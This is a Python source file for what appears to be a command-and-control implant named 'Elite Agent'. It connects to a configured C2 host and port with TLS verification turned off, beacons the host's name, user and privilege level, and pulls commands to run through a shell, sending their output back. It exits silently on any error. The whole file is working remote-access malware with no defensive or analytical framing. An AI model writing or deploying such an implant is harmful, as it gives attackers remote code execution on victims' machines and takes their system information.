#!/usr/bin/env python3
# Elite Agent - Generated 2025-10-21T16:04:20.431299

import socket
import ssl
import json
import time
import os
import sys
import platform
import subprocess
import threading
import queue
import base64
import hashlib
import hmac
import zlib
import struct
import random
from pathlib import Path

# Configuration
CONFIG = {
    "c2_host": "0.0.0.0",
    "c2_port": 4444,
    "auth_token": "CHANGE_THIS_SECRET_TOKEN",
    "beacon_interval": 60,
    "beacon_jitter": 10
}

# Agent identification
AGENT_ID_SEED = "qVklaiDbIeeHpxvA"

class C2Protocol:
    """Embedded C2 protocol handler"""
    
    def __init__(self, auth_token):
        self.auth_token = auth_token
        self.shared_key = hashlib.sha256(auth_token.encode()).digest()
        self.enc_key = hashlib.sha256(self.shared_key + b'encryption').digest()[:32]
        self.hmac_key = hashlib.sha256(self.shared_key + b'authentication').digest()
        self.message_counter = 0
    
    def create_message(self, msg_type, payload, compress=True):
        """Create protocol message"""
        
        # Serialize payload
        payload_bytes = json.dumps(payload).encode('utf-8')
        
        # Compress if beneficial
        flags = 0
        if compress and len(payload_bytes) > 100:
            compressed = zlib.compress(payload_bytes, 9)
            if len(compressed) < len(payload_bytes):
                payload_bytes = compressed
                flags |= 0x01
        
        # Simple XOR encryption (simplified from AES for portability)
        encrypted = self._xor_encrypt(payload_bytes)
        flags |= 0x02
        
        # Message ID
        self.message_counter += 1
        msg_id = self.message_counter % 65536
        
        # Build header
        header = struct.pack('>IBBH',
            len(encrypted) + 8 + 32,  # Total length
            msg_type,  # Message type
            flags,  # Flags
            msg_id  # Message ID
        )
        
        # Combine and add HMAC
        message = header + encrypted
        hmac_value = hmac.new(self.hmac_key, message, hashlib.sha256).digest()
        
        return message + hmac_value
    
    def parse_message(self, data):
        """Parse protocol message"""
        
        if len(data) < 40:
            return None, None
        
        # Verify HMAC
        message = data[:-32]
        provided_hmac = data[-32:]
        expected_hmac = hmac.new(self.hmac_key, message, hashlib.sha256).digest()
        
        if provided_hmac != expected_hmac:
            return None, None
        
        # Parse header
        length, type_byte, flags, msg_id = struct.unpack('>IBBH', message[:8])
        
        # Extract and decrypt payload
        payload_bytes = message[8:]
        
        if flags & 0x02:
            payload_bytes = self._xor_encrypt(payload_bytes)  # XOR is reversible
        
        if flags & 0x01:
            payload_bytes = zlib.decompress(payload_bytes)
        
        try:
            payload = json.loads(payload_bytes.decode('utf-8'))
            return type_byte, payload
        except:
            return None, None
    
    def _xor_encrypt(self, data):
        """Simple XOR encryption"""
        result = bytearray()
        for i, byte in enumerate(data):
            result.append(byte ^ self.enc_key[i % len(self.enc_key)])
        return bytes(result)

class EliteAgent:
    """Main agent class"""
    
    def __init__(self):
        self.config = CONFIG
        self.protocol = C2Protocol(self.config['auth_token'])
        self.running = True
        self.socket = None
        self.command_queue = queue.Queue()
        self.agent_id = self._generate_agent_id()
        
        # System information
        self.system_info = self._gather_system_info()
    
    def _generate_agent_id(self):
        """Generate unique agent ID"""
        unique = f"{platform.node()}{os.getlogin()}{AGENT_ID_SEED}"
        return hashlib.md5(unique.encode()).hexdigest()[:12]
    
    def _gather_system_info(self):
        """Gather system information"""
        try:
            return {
                'agent_id': self.agent_id,
                'hostname': platform.node(),
                'username': os.getlogin() if hasattr(os, 'getlogin') else os.environ.get('USER', 'unknown'),
                'platform': platform.platform(),
                'architecture': platform.machine(),
                'processor': platform.processor(),
                'python_version': sys.version,
                'cwd': os.getcwd(),
                'privileges': 'admin' if os.getuid() == 0 else 'user' if hasattr(os, 'getuid') else 'unknown'
            }
        except:
            return {'agent_id': self.agent_id, 'hostname': 'unknown'}
    
    def connect(self):
        """Connect to C2 server"""
        while self.running:
            try:
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                
                # Use SSL if available
                try:
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    self.socket = context.wrap_socket(self.socket)
                except:
                    pass  # Continue without SSL
                
                self.socket.connect((self.config['c2_host'], self.config['c2_port']))
                return True
                
            except Exception as e:
                time.sleep(10)
                continue
        
        return False
    
    def send_message(self, msg_type, payload):
        """Send message to C2"""
        try:
            message = self.protocol.create_message(msg_type, payload)
            self.socket.send(message)
            return True
        except:
            return False
    
    def receive_message(self):
        """Receive message from C2"""
        try:
            # Read length prefix
            length_data = self.socket.recv(4)
            if not length_data:
                return None, None
            
            length = struct.unpack('>I', length_data)[0]
            
            # Read full message
            data = length_data
            while len(data) < length:
                chunk = self.socket.recv(min(4096, length - len(data)))
                if not chunk:
                    return None, None
                data += chunk
            
            return self.protocol.parse_message(data)
            
        except:
            return None, None
    
    def beacon(self):
        """Send initial beacon"""
        
        # Add authentication
        auth_data = f"{self.system_info.get('hostname', '')}{self.system_info.get('username', '')}"
        self.system_info['auth'] = hmac.new(
            self.config['auth_token'].encode(),
            auth_data.encode(),
            hashlib.sha256
        ).hexdigest()
        
        return self.send_message(0x01, self.system_info)  # BEACON = 0x01
    
    def heartbeat(self):
        """Send heartbeat"""
        payload = {
            'agent_id': self.agent_id,
            'timestamp': time.time()
        }
        return self.send_message(0x02, payload)  # HEARTBEAT = 0x02
    
    def execute_command(self, command):
        """Execute system command"""
        try:
            if command.startswith('cd '):
                # Handle directory change
                path = command[3:].strip()
                os.chdir(path)
                return f"Changed directory to {os.getcwd()}", "", 0
            else:
                # Execute command
                result = subprocess.run(
                    command,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=30
                )
                return result.stdout, result.stderr, result.returncode
                
        except subprocess.TimeoutExpired:
            return "", "Command timed out", -1
        except Exception as e:
            return "", str(e), -1
    
    def handle_command(self, command_data):
        """Handle command from C2"""
        command_id = command_data.get('command_id')
        command = command_data.get('command')
        
        if not command:
            return
        
        # Execute command
        start_time = time.time()
        stdout, stderr, exit_code = self.execute_command(command)
        execution_time = time.time() - start_time
        
        # Send result
        result_payload = {
            'command_id': command_id,
            'output': stdout[:50000],  # Limit output size
            'error': stderr[:10000],
            'exit_code': exit_code,
            'execution_time': execution_time
        }
        
        self.send_message(0x03, result_payload)  # RESULT = 0x03
    
    def communication_loop(self):
        """Main communication loop"""
        
        last_heartbeat = 0
        
        while self.running:
            try:
                current_time = time.time()
                
                # Send heartbeat if needed
                if current_time - last_heartbeat > self.config['beacon_interval']:
                    self.heartbeat()
                    last_heartbeat = current_time
                    
                    # Add jitter
                    time.sleep(random.randint(0, self.config['beacon_jitter']))
                
                # Check for commands
                self.send_message(0x07, {'agent_id': self.agent_id})  # REQUEST_COMMAND = 0x07
                
                # Receive response
                msg_type, payload = self.receive_message()
                
                if msg_type == 0x10:  # COMMAND
                    self.handle_command(payload)
                elif msg_type == 0x13:  # TERMINATE
                    self.running = False
                    break
                elif msg_type == 0x14:  # SLEEP
                    time.sleep(payload.get('duration', 60))
                
                # Small delay to avoid spinning
                time.sleep(1)
                
            except Exception as e:
                # Connection lost, reconnect
                self.socket.close()
                time.sleep(10)
                if not self.connect():
                    break
                self.beacon()
    
    def run(self):
        """Main agent entry point"""
        
        # Connect to C2
        if not self.connect():
            return
        
        # Send initial beacon
        if not self.beacon():
            return
        
        # Start communication loop
        self.communication_loop()
        
        # Cleanup
        try:
            self.socket.close()
        except:
            pass


# Main execution
if __name__ == "__main__":
    try:
        agent = EliteAgent()
        agent.run()
    except KeyboardInterrupt:
        pass
    except:
        # Silent exit on error
        pass
